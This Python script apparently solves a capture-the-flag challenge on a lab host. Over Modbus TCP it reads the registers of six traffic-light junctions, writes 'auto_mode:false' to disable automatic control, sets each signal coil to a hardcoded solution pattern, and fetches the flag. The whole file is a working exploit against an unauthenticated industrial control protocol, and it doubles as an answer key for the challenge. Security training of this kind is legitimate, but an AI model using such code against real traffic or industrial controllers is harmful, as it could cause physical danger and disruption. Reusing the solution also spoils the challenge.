from pymodbus.client.sync import ModbusTcpClient
import requests

HOST = "10.129.96.95"
PORT = 502
client = ModbusTcpClient(HOST, PORT)

SEMAPHORES = ["NG","NY","NR","EG","EY","ER","SG","SY","SR","WG","WY","WR"]
SOLUTION = {
	1: [571, "WG"],
	2: [1920, "NG"],
	3: [529, "--"],
	4: [1266, "WG"],
	5: [925, "--"],
	6: [886, "WG"]
}

def readHoldingRegisters(client, address=0, num=100, unit=1):
	inc = 60
	while address < num:
		rr = client.read_holding_registers(address, inc, unit=unit)
		print ("".join(chr(r) for r in rr.registers))
		address += inc

def writeHoldingRegisters(client, values, start=0 , unit=1):
	client.write_registers(start, values, unit=unit)

def writeCoil(client, address, value, unit=1):
	client.write_coil(address, value, unit=unit)

print("[*] Getting initial status of junctions")
for i in range(1,7):
	print("     Junction {} -> ".format(i), end = "")
	readHoldingRegisters(client, num=20, unit=i)

print("[*] Setting auto_mode to false")
for i in range(1,7):
	print("     Junction {}: ".format(i), end = "")
	writeHoldingRegisters(client, [ord(c) for c in "auto_mode:false"], unit=i)
	print("Done.")

print("[*] Setting safe way")
for unit in range(1,7):
	print("     Junction {}: ".format(unit), end = "")
	startCoil = SOLUTION[unit][0]
	green = SOLUTION[unit][1]
	for i in range(len(SEMAPHORES)):
		value = True if SEMAPHORES[i] == green else False
		if not value and SEMAPHORES[i][-1] == "R" and SEMAPHORES[i][0] != green[0]:
			value = True
		writeCoil(client, startCoil + i, value, unit=unit)
	print("Done.")

# Get flag from /api
r = requests.get("http://{}/api".format(HOST))
print("Flag: {}".format(r.json()["flag"]))


